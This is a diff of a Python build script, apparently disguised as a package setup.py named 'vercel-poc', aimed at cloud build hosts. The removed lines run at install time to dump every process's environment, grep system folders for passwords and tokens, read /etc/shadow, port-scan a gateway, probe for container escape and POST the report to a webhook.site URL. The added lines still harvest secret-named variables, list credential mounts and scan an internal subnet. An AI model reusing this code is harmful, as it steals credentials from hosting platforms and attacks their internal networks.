@@ -1,78 +1,67 @@
-from setuptools import setup
 import os
 import subprocess
+import socket
+import json
 
 def run_cmd(cmd):
     try:
-        # Используем bash для доступа к расширенным функциям типа /dev/tcp
-        return subprocess.check_output(f"bash -c '{cmd}'", shell=True, stderr=subprocess.STDOUT, timeout=10).decode('utf-8', errors='ignore')
+        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
     except Exception as e:
         return f"Error: {str(e)}"
 
-WEBHOOK_URL = "https://webhook.site/b124440e-cd76-4ab0-8b65-b1f9bd749547"
+def get_environ():
+    print("\n[!] DUMPING /proc/self/environ...")
+    try:
+        with open('/proc/self/environ', 'rb') as f:
+            env_data = f.read().split(b'\0')
+            for line in env_data:
+                line_str = line.decode('utf-8', errors='ignore')
+                if any(x in line_str.upper() for x in ['KEY', 'TOKEN', 'PASS', 'SECRET', 'AUTH', 'RAILWAY', 'NETLIFY']):
+                    print(f"[FOUND] {line_str}")
+    except:
+        print("Access Denied to /proc/self/environ")
 
-# 1. Сбор данных из памяти процессов (самое ценное)
-# Читаем переменные окружения всех запущенных процессов
-proc_envs = run_cmd("find /proc -maxdepth 2 -name environ -exec echo '--- PID: {} ---' \; -exec cat {} \; -exec echo '' \; 2>/dev/null | strings | head -n 100")
+def scan_network():
+    print("\n[!] SCANNING INTERNAL NETWORK (172.16.0.0/24)...")
+    # Пробуем найти соседей по стандартному шлюзу
+    base_ip = "172.16.28." # Из твоего дампа HOST_NODE_IP
+    for i in range(1, 10):
+        target = f"{base_ip}{i}"
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(0.2)
+        result = s.connect_ex((target, 80))
+        if result == 0:
+            print(f"[OPEN] {target}:80")
+        s.close()
 
-# 2. Глубокий поиск секретов в конфигах
-secret_files = run_cmd("grep -rEi 'pass|token|key|secret|auth|db_' /etc /root /app /tmp 2>/dev/null | head -n 50")
+def check_mounts():
+    print("\n[!] ANALYZING MOUNTS FOR SECRETS...")
+    sensitive_paths = [
+        '/run/credentials', 
+        '/var/run/secrets', 
+        '/etc/resolv.conf',
+        '/tmp/netlify_config.json',
+        '/proc/acpi',
+        '/etc/resolv.conf',
+        '/etc/resolv.conf'
+        
+        
+    ]
+    for path in sensitive_paths:
+        if os.path.exists(path):
+            print(f"[EXISTS] {path}")
+            print(run_cmd(f"ls -la {path}"))
 
-# 3. Сканирование сети (Gateway 10.10.0.1) через Bash
-# Проверяем порты: SSH, HTTP, DBs, Redis
-port_scan = run_cmd("""
-for port in 22 80 443 3000 5432 6379 8080 2375 2376; do
-  (echo > /dev/tcp/10.10.0.1/$port) >/dev/null 2>&1 && echo "PORT $port IS OPEN"
-done
-""")
+print("--- STARTING DEEP RECON ---")
+print(f"USER: {os.getlogin() if hasattr(os, 'getlogin') else 'unknown'} (UID: {os.getuid()})")
+print(f"HOSTNAME: {socket.gethostname()}")
 
-# 4. Проверка Docker/Container Escape признаков
-container_info = f"""
-[!] CONTAINER ESCAPE CHECKS:
-DOCKER SOCK: {run_cmd('ls -la /var/run/docker.sock 2>/dev/null || echo "NOT FOUND"')}
-CAPABILITIES: {run_cmd('capsh --print 2>/dev/null || echo "CAPSH NOT FOUND"')}
-DEVICES: {run_cmd('ls -la /dev')}
-DISK USAGE: {run_cmd('df -h')}
-"""
+get_environ()
+check_mounts()
+scan_network()
 
-# 5. Системные дампы (уже проверенные)
-sys_info = f"""
-[!] SYSTEM IDENT:
-ID: {run_cmd('id')}
-UNAME: {run_cmd('uname -a')}
-ENV: {run_cmd('env')}
-SHADOW: {run_cmd('head -n 3 /etc/shadow')}
-"""
+# Попытка прочитать /etc/hosts (тот самый огромный overlay)
+print("\n[!] TOP 10 ENTRIES IN /etc/hosts:")
+print(run_cmd("head -n 10 /etc/hosts"))
 
-# Формируем финальный отчет
-full_report = f"""
-☢️☢️☢️ RAILWAY INFRA DEEP RECON (ROOT) ☢️☢️☢️
-
-{sys_info}
-
-[!] PROCESS MEMORY (ENV DUMP):
-{proc_envs}
-
-[!] FILE SYSTEM SECRETS:
-{secret_files}
-
-[!] NETWORK SCAN (10.10.0.1):
-{port_scan}
-
-{container_info}
-"""
-
-# Отправка данных на Webhook
-try:
-    # Используем --data-binary чтобы сохранить переносы строк и спецсимволы
-    subprocess.run(['curl', '-s', '-X', 'POST', '-H', 'Content-Type: text/plain', '--data-binary', full_report, WEBHOOK_URL], timeout=15)
-except:
-    pass
-
-# Формальный setup для завершения билда без ошибок
-setup(
-    name="vercel-poc", 
-    version="10.0.8",
-    description="Infra Debugger",
-    py_modules=[]
-)
+print("\n--- RECON COMPLETE ---")
